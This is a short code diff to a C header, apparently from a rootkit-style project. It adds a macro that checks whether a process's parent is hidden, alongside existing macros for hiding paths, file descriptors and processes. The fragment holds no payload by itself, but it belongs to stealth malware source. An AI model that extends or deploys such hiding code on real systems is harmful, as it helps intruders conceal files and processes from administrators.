@@ -24,6 +24,7 @@ int _l_hidden_path(const char *pathname, short mode);
 int hidden_proc(pid_t pid);
 #include "hidden.c"
 
+#define hidden_ppid(pid)     hidden_proc(getppid())
 #define hidden_path(path)    _hidden_path(path, MODE_REG)
 #define hidden_path64(path)  _hidden_path(path, MODE_64)
 #define hidden_fd(fd)        _f_hidden_path(fd, MODE_REG)
